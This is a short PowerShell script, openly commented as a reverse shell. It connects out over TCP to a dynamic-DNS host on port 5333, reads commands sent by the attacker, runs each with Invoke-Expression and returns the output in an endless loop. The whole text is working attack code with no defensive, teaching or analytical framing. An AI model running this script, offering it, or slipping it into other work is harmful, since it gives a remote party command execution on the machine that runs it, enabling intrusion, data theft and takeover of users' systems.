# Set up the reverse shell
$IPAddress = "dnsaddress.ddns.net"
$Port = 5333
# Create a TCP client
$Client = New-Object System.Net.Sockets.TcpClient($IPAddress, $Port)
# Create a stream
$Stream = $Client.GetStream()
# Create a StreamReader for communication
$Reader = New-Object System.IO.StreamReader($Stream)
$Writer = New-Object System.IO.StreamWriter($Stream)
# Start a loop for continuous communication
while ($true) {
    # Read the command from the attacker
    $Command = $Reader.ReadLine()
    # Execute the command and get the output
    $Output = Invoke-Expression -Command $Command
    # Send the output back to the attacker
    $Writer.WriteLine($Output)
    $Writer.Flush()
}
$Stream.Close()
$Client.Close()
